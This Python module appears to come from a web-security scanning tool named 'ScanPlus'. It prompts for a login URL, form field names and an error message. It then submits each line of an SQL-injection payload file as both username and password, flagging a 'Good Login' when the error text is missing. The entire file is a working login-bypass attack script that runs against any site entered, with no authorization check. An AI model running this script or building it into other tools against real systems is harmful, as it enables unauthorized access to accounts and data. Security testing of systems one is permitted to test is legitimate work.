import requests
from ScanPlus.some_function import *
import os
from threading import Thread



def is_bruteforce(url, username, password, submit, error):
    userPass = os.getcwd() + "/OwaspScan/A03/SQL_i/sqli.txt"
    with open(userPass, "r") as up:
        liste = up.readlines()
        k = 0
        for l in liste:
            data = l.split("\n")[0]
            user = data
            passw = data
            headers = {'User-Agent': 'Mozilla/5.0'}
            payload = {username: user, password: passw, submit: "Ok"}
            link = url
            session = requests.Session()
            try:
                resp = session.get(link, headers=headers)
            except Exception as e:
                print(e)
            cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
            print(cookies)
            try:
                resp = session.post(link, headers=headers, data=payload, cookies=cookies)
            except Exception as e:
                print(e)
            print(resp.headers)
            if resp.status_code == 200:
                k = k + 1
                if error in resp.text:
                    print_red_bold("login-{} : username = {} || password = {} =====>>>>> Bad Login".format(k, user, passw))
                else:
                    print_green("login-{} : username = {} || password = {} =====>>>>> Good Login".format(k, user, passw))
                    break
            else:
                print_green("Check your connection settings")
                break








def SQL_i():
    print_blue("You have choisen SQL injection Attack")

    print("\nEnter your url login ex: https://example.com/login")
    url = input("[ScanPlus] $ url >> ")

    print("\nEnter the name of Username parameter. ex: user")
    username = input("[ScanPlus] $ username >> ")

    #print("\nEnter the name of Email parameter. ex: email")
    #email = input("[ScanPlus] $ email >> ")

    print("\nEnter the name of your password parameter. ex: pass")
    password = input("[ScanPlus] $ password >> ")


    print("\nEnter the error result. ex: Identifiants invalides.")
    error = input("[ScanPlus] $ error >> ")

    print("\nEnter the name of your submit parameter. ex: submit")
    submit = input("[ScanPlus] $ submit >> ")


    is_bruteforce(url, username, password, submit, error)
